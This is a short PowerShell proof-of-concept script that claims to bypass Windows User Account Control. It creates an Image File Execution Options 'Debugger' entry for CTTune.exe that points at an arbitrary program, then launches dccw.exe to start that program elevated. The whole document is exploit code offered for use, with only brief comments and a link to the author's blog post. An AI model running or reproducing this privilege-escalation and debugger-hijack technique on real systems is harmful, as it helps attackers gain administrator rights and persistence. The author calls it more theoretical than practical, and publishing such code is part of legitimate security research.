<#
.SYNOPSIS  
    This PowerShell script bypasses User Access Control (UAC) via dccw.exe on Windows 8.1 and above.   

    A new registry key will be created in: "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" to perform the bypass 
    and start an elevated command prompt. Hello PowerShell :-) 
    
    Pure PoC, and more theoretical rather than practical, see the LINK for more information.
   
.NOTES  
    Author		: @bartblaze
    License		: MIT
    Function		: dccwUACBypass
    File Name		: dccwUACBypass.ps1 

.LINK       
    https://bartblaze.blogspot.com/2017/06/display-color-calibration-tool-dccw-and.html
    
.EXAMPLE
	 By default, PowerShell will be started.
	 
	 If you want to load specific programs, you'll need to pass them as an argument, like so:
	 dccwUACBypass -program "calc.exe"
	 
	 You may also change the $program string below.
 
#>


function dccwUACBypass{ 
 Param (
           
        [String]$program = "cmd.exe /c powershell.exe" #default
       )
    #Create Registry Key:
    New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CTTune.exe" -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CTTune.exe" -Name "Debugger" -Value $program -Force

    #Start dccw.exe, visible to the user:
    Start-Process "C:\Windows\SysWOW64\dccw.exe"
}
